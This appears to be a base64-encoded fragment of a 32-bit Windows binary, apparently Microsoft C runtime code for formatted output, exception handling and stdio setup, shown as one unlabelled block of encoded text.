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AzwION6Pv///+L2ImFqPv//4mFwPv//4mF0Pv//4mF3Pv//4md7Pv//4mF1Pv//+nQCQAAD7fCaiBaK8J0RoPoA3Q5g+gIdC9ISHQdg+gDi4X4+///D4WvCQAAg8sIiZ3s+///6aEJAACDywSJnez7///pjQkAAIPLAevwgcuAAAAA6+iDywLr42oqWGY70HUviweDxwSJvfD7//+JhdD7//+FwA+JWgkAAIPLBPfYiZ3s+///iYXQ+///6UQJAABrjdD7//8KD7fCg8HQA8GJhdD7///pJAkAADPAiYXo+///6R0JAABqKlhmO9B1K4sHg8cEiYXo+///hcCLhfj7//+JvfD7//8PifwIAACDjej7////6fAIAABrjej7//8KD7fCg8HQA8GJhej7///pyggAAA+3woP4SXRXg/hodEhqbFo7wnQag/h3i4X4+///D4WzCAAAgcsACAAA6fz+//+Lhfj7//9mORB1FIPAAoHLABAAAImF+Pv//+nd/v//g8sQ6dX+//9qIFgL2OnZ/v//i4X4+///D7cAg/g2dSOLvfj7//9mg38CNHUWi8eDwASBywCAAACJhfj7///pmv7//4P4M3Uji734+///ZoN/AjJ1FovHg8AEgeP/f///iYX4+///6XL+//9mO4WM+///D4QLCAAAZjuFiPv//w+E/gcAAGY7hZj7//8PhPEHAACD+HUPhOgHAACD+HgPhN8HAABmO4WQ+///D4TSBwAAM8CJhcz7//+NheD7///HhdT7//8BAAAAUP+12Pv//1LoOwgAAIPEDOmfBwAAD7fCg/hkD48pAgAAD4SxAgAAg/hTD48lAQAAdH2D6EF0EEhIdFhISHQISEgPhZoFAABqIFgD0MeFqPv//wEAAACJleT7//+Lhej7//+Ntfz7//+Dy0C5AAIAAImd7Pv//4mN9Pv//4XAD4mOAgAAx4Xo+///BgAAAOnfAgAA98MwCAAAD4XYAAAAaiBYC9iJnez7///pyAAAAPfDMAgAAHULaiBYC9iJnez7//+Llej7//+/////f4P6/3QCi/qLtfD7//+DxgSJtfD7//+Ldvz2wyAPhL8EAACF9nUGizX0pAEQM8mLxomF5Pv//4mN9Pv//4X/D47QBAAAigCEwA+ExgQAAI2NsPv//w+2wFFQ6D5CAABZhcCLheT7//9ZdAFAi430+///QEGJheT7//+JjfT7//87z3zB6YwEAACD6FgPhNwCAABISA+EiwAAAIPoBw+E7f7//0hID4VqBAAAD7cHg8cEx4XU+///AQAAAIm98Pv//4mFoPv///bDIHREiIXE+///M8CIhcX7//+NhbD7//9Qi4Ww+////3B0jYXE+///UI2F/Pv//1DohkMAAIPEEIXAeRPHhcD7//8BAAAA6wdmiYX8+///M8mNtfz7//9B6eoDAACLB4PHBIm98Pv//4XAdDaLcASF9nQv98MACAAAdBcPvwCZK8LHhdT7//8BAAAAi8jpswMAADPJiY3U+///D78I6aUDAACLNfSkARBW6IEwAABZi8jpkQMAAIP4cA+P6wEAAA+E1wEAAIP4ZQ+MfwMAAIP4Zw+O8f3//2ppWjvCdGaD+G50J2pvWjvCD4VfAwAAx4Xk+///CAAAAITbeVuBywACAACJnez7///rTYPHBIm98Pv//4t//OgFQQAAhcAPhEUFAACLheD7///2wyB0BWaJB+sCiQfHhcD7//8BAAAA6cMEAACDy0CJnez7///HheT7//8KAAAA98MAgAAAdQz3wwAQAAAPhJcBAACLD4PHCIm98Pv//4t//OmwAQAAdRRqZ1hmO9B1VseF6Pv//wEAAADrSjvBfgiLwYmF6Pv//z2jAAAAfjeNuF0BAABX6DksAACLleT7//+Jhaz7//9ZhcB0Covwib30+///6wrHhej7//+jAAAAi73w+///iweDxwiJhXj7//+JvfD7//+LR/yJhXz7//+NhbD7//9Q/7Wo+///D77C/7Xo+///UP+19Pv//42FePv//1ZQ/zXkpAEQ/xU48AAQ/9CL+4PEHIHngAAAAHQhg73o+///AHUYjYWw+///UFb/NfCkARD/FTjwABD/0FlZamdYZjmF5Pv//3Uchf91GI2FsPv//1BW/zXspAEQ/xU48AAQ/9BZWYA+LQ+FHv7//4HLAAEAAEaJnez7///pDP7//8eF6Pv//wgAAABqB+scg+hzD4R7/P//SEgPhJL+//+D6AMPhYkBAABqJ8eF5Pv//xAAAABYiYWk+///hNsPiXj+//9qMFmDwFFmiY3I+///ZomFyvv//8eF3Pv//wIAAADpVf7//4PHBIm98Pv///bDIHQR9sNAdAYPv0f86w4Pt0f86wj2w0B0DItH/JmLyIv6M8DrB4tP/DPAi/j2w0B0HDv4fxh8BDvIcxL32RP499+BywABAACJnez7///3wwCQAAB1Aov4i5Xo+///hdJ5BTPSQusWg+P3iZ3s+///gfoAAgAAfgW6AAIAAIvBC8d1BomF3Pv//421+/3//4vCSomV6Pv//4XAfwaLwQvHdD2LheT7//+ZUlBXUegRQQAAg8EwiZ2E+///iYX0+///i/qD+Tl+BgONpPv//4uV6Pv//4gOTouN9Pv//+uwi53s+///jY37/f//K85GiY30+///98MAAgAAdEWFyXQFgD4wdDxOQWowWIgG6y2F9nUGizX4pAEQx4XU+///AQAAAIvOhf90DzPAT2Y5AXQHg8EChf918yvO0fmJjfT7//+DvcD7//8AD4WtAQAA9sNAdCD3wwABAAAPhB0BAABqLVhmiYXI+///x4Xc+///AQAAAGogWou90Pv//4uF3Pv//yv5K/j2wwx1HY2F4Pv//1D/tdj7//9XUug/AgAAi4Xc+///g8QQ/7Wc+///jY3g+///Uf+12Pv//1CNhcj7//9Q6EICAACDxBT2wwh0H/bDBHUajYXg+///UP+12Pv//1dqMFhQ6PIBAACDxBCDvdT7//8Ai4X0+///D4WzAAAAhcAPjqsAAACLzom15Pv//0iJhYT7//+NhbD7//9Qi4Ww+////3B0jYWg+///UVDoeT4AAIPEEImFlPv//4XAfmeNheD7//9Q/7XY+////7Wg+///6E0BAACLjeT7//+DxAwDjZT7//+LhYT7//+JjeT7//+FwH+Y61b2wwF0B2or6dn+///2wwIPhOL+//9qIFpmiZXI+///x4Xc+///AQAAAOnM/v//g8j/iYXg+///6yP/tZz7//+NjeD7//9R/7XY+///UFboOwEAAIPEFIuF4Pv//4XAeB/2wwR0Go2F4Pv//1D/tdj7//9XaiBYUOjmAAAAg8QQi4Ws+///hcB0D1Doe+7//zPAWYmFrPv//4uN9Pv//4uF+Pv//w+3EIuF4Pv//4mV5Pv//2aF0g+FfvX//4C9vPv//wB0CouNuPv//4NhcP2LTfxfXjPNW+hO5P//i+Vdw+hWAQAAxwAWAAAA6Cjx//+Avbz7//8AD4TV9P//i424+///g2Fw/enG9P//TTYAEBM0ABBHNAAQnDQAEO00ABD6NAAQRz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